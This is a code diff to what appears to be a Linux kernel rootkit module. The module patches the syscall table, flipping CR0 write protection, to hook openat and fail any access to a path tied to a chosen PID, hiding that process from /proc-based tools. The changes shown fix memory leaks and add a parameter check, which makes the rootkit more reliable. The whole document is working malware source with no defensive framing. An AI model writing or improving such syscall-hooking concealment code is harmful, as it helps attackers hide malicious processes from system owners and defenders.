@@ -12,7 +12,7 @@
 void initialize_path_to_hide(void);
 
 // Types & other consts.
-static char *pid_to_hide;
+static char *pid_to_hide = NULL;
 module_param(pid_to_hide, charp, 0);
 
 typedef int (*original_openat_t)(const struct pt_regs *regs);
@@ -35,16 +35,18 @@ static inline void one_cr0(void) {
 }
 
 int new_openat(const struct pt_regs *regs) {
-    void *path_name_pointer = (void *)regs->si;
+    void *path_name_pointer = (void*)regs->si;
     char *path;
     path = kmalloc(PATH_MAX, GFP_KERNEL);
-    copy_from_user((void *)path, path_name_pointer, PATH_MAX);
+    copy_from_user((void*)path, path_name_pointer, PATH_MAX);
 
-    // If the target is inside the path we're trying to hide, return an error.
+    // If the target is contained within/is the path we're trying to hide, return an error.
     if (strstr(path, path_to_hide) != NULL) {
+        kfree(path);
         return -1;
     }
 
+    kfree(path);
     return original_openat_ptr(regs);
 }
 
@@ -56,6 +58,11 @@ void initialize_path_to_hide(void) {
 }
 
 int load(void) {
+    if (pid_to_hide == NULL) {
+        printk(KERN_ALERT "Pid to hide has not been set! Exiting...");
+        return -1;
+    }
+
     printk(KERN_ALERT "Initializing...");
     initialize_path_to_hide();
 
@@ -76,6 +83,8 @@ void unload(void) {
     syscall_table[__NR_openat] = (unsigned long)original_openat_ptr;  
     printk(KERN_ALERT "openat has been restored!");
     one_cr0();
+
+    kfree(path_to_hide);
     printk(KERN_ALERT "Goodbye world...");
 }
 
